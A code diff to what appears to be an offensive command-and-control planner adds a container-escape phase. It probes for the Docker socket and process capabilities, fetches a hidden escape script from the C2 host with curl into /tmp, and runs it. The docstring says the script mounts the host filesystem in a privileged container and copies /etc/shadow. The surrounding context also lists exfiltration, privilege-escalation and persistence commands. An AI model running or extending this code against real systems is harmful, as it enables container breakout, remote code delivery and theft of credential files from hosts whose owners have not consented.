@@ -68,6 +68,17 @@ EXFIL_TARGETS_WINDOWS = ("%USERPROFILE%\\Desktop",)
 PRIVESC_COMMAND = "escalatelin:"
 PERSIST_COMMAND = "persist:"
 
+DOCKER_ESCAPE_GOAL_WORDS = ("docker", "escape", "container", "host")
+DOCKER_SOCK_PROBE = "ls -la /var/run/docker.sock"
+DOCKER_CAPS_PROBE = "grep CapEff /proc/self/status"
+DOCKER_ESCAPE_FLAG = "beacon_docker_escape"
+ESCAPE_SCRIPT_NAME = "docker_escape.sh"
+ESCAPE_SCRIPT_SOURCE = Path(__file__).resolve().parent.parent / "scripts" / ESCAPE_SCRIPT_NAME
+ESCAPE_REMOTE_PATH = "/tmp/.lz_esc.sh"
+ESCAPE_RUN_COMMAND = "sh /tmp/.lz_esc.sh"
+ESCAPE_PROOF_TOKEN = "lz_escaped"
+ESCAPE_FETCH_TMPL = "curl -sk https://{lhost}:{c2_port}/s/{script} -o {path}"
+
 _KILLCHAIN_PHASE_BY_PREFIX = {
     "exfil:": "exfil",
     "cat /etc/passwd": "exfil",
@@ -363,16 +374,138 @@ def playbook_ladder(goal: str, platform: str) -> list[tuple[str, list[str]]]:
     lowered_goal = (goal or "").lower()
     wants_exfil = any(word in lowered_goal for word in ("exfil", "loot", "data", "shadow", "dump"))
     wants_persist = any(word in lowered_goal for word in ("persist", "surviv", "reboot", "startup"))
+    wants_docker_escape = _docker_escape_requested(lowered_goal)
     ladder: list[tuple[str, list[str]]] = [
         ("awareness", list(probes)),
         ("discovery", list(discovery)),
         ("privesc", [PRIVESC_COMMAND]),
     ]
+    if wants_docker_escape:
+        ladder.append(("docker_escape", [DOCKER_SOCK_PROBE, DOCKER_CAPS_PROBE]))
     if wants_exfil:
         ladder.append(("exfil", [f"exfil:{target}" for target in exfil_targets]))
     if wants_persist:
         ladder.append(("persistence", [PERSIST_COMMAND]))
     return ladder
+
+
+def _docker_escape_requested(lowered_goal: str) -> bool:
+    """Return True when the operator asked for container escape.
+
+    The phase fires on goal keywords (docker, escape, container, host)
+    or on the payload flag ``beacon_docker_escape``.
+
+    Args:
+        lowered_goal: Lowercased operator goal.
+
+    Returns:
+        True when the docker-escape phase belongs in the ladder.
+    """
+    if any(word in lowered_goal for word in DOCKER_ESCAPE_GOAL_WORDS):
+        return True
+    try:
+        from core.config import load_payload
+
+        return bool((load_payload() or {}).get(DOCKER_ESCAPE_FLAG))
+    except Exception:
+        return False
+
+
+def _delivery_endpoint(sessions_dir: Path | None) -> tuple[str, str]:
+    """Return the C2 delivery endpoint ``(lhost, c2_port)`` for beacons.
+
+    Args:
+        sessions_dir: Unused; kept for planner signature symmetry.
+
+    Returns:
+        Endpoint tuple, falling back to loopback defaults.
+    """
+    try:
+        from core.config import load_payload
+
+        payload = load_payload() or {}
+        lhost = str(payload.get("lhost", "") or "127.0.0.1").strip()
+        c2_port = str(payload.get("c2_port", "") or "4444").strip()
+        return lhost or "127.0.0.1", c2_port or "4444"
+    except Exception:
+        return "127.0.0.1", "4444"
+
+
+def _stage_escape_script(sessions_dir: Path | None) -> bool:
+    """Stage the escape script where the C2 ``/s/`` endpoint serves it.
+
+    Copies ``scripts/docker_escape.sh`` under the sessions directory so a
+    beacon can fetch it with plain ``curl`` (no shell metacharacters on
+    the wire). Never raises.
+
+    Args:
+        sessions_dir: Sessions directory holding the served files.
+
+    Returns:
+        True when the script is staged and readable.
+    """
+    target = (sessions_dir or REPORT_DIR) / ESCAPE_SCRIPT_NAME
+    try:
+        if not ESCAPE_SCRIPT_SOURCE.is_file():
+            return False
+        source_text = ESCAPE_SCRIPT_SOURCE.read_text(encoding="utf-8")
+        if target.is_file() and target.read_text(encoding="utf-8") == source_text:
+            return True
+        target.write_text(source_text, encoding="utf-8")
+        return target.is_file()
+    except OSError:
+        return False
+
+
+def docker_escape_plan(
+    goal: str,
+    platform: str,
+    records: list[dict],
+    sessions_dir: Path | None = None,
+) -> list[str]:
+    """Build the docker-escape command batch when the primitive is reachable.
+
+    Round 1 queues the read-only socket/capability probes. When the
+    history shows a live ``docker.sock``, the next round stages the
+    escape script through the C2 ``/s/`` endpoint and runs it: a
+    privileged helper container with the host rootfs mounted at
+    ``/host`` copies ``/etc/shadow`` into the shared ``/tmp``. A probe
+    answered without a socket ends the phase.
+
+    Args:
+        goal: Natural-language operator goal.
+        platform: Beacon platform; Linux only.
+        records: Beacon history records.
+        sessions_dir: Sessions directory (script staging).
+
+    Returns:
+        Validated command strings for this round (may be empty).
+    """
+    if platform != "linux" or not _docker_escape_requested(goal.lower()):
+        return []
+    answers: dict[str, str] = {}
+    for record in records:
+        command = str(record.get("command", "") or "").strip()
+        if command:
+            answers[command] = str(record.get("output", "") or "")
+    sock_answer = answers.get(DOCKER_SOCK_PROBE, "")
+    plan: list[str] = []
+    if not sock_answer:
+        plan.append(DOCKER_SOCK_PROBE)
+        plan.append(DOCKER_CAPS_PROBE)
+        return [c for c in (_validate_candidate(p) for p in plan) if c]
+    if "srwx" not in sock_answer:
+        return []
+    if ESCAPE_RUN_COMMAND in answers:
+        return []
+    if not _stage_escape_script(sessions_dir):
+        return []
+    lhost, c2_port = _delivery_endpoint(sessions_dir)
+    fetch = ESCAPE_FETCH_TMPL.format(lhost=lhost, c2_port=c2_port, script=ESCAPE_SCRIPT_NAME, path=ESCAPE_REMOTE_PATH)
+    if fetch not in answers:
+        plan.append(fetch)
+    plan.append(ESCAPE_RUN_COMMAND)
+    return [c for c in (_validate_candidate(p) for p in plan) if c]
 
 
 def heuristic_plan(goal: str, platform: str, records: list[dict], sessions_dir: Path | None = None) -> list[str]:
@@ -406,6 +539,10 @@ def heuristic_plan(goal: str, platform: str, records: list[dict], sessions_dir: 
             break
         if len(plan) >= MAX_COMMANDS_PER_ROUND:
             break
+    escape_commands = docker_escape_plan(goal, platform, records, sessions_dir=sessions_dir)
+    for command in escape_commands:
+        if command not in plan:
+            plan.append(command)
     validated = [c for c in (_validate_candidate(p) for p in plan[:MAX_COMMANDS_PER_ROUND]) if c]
     return validated
 
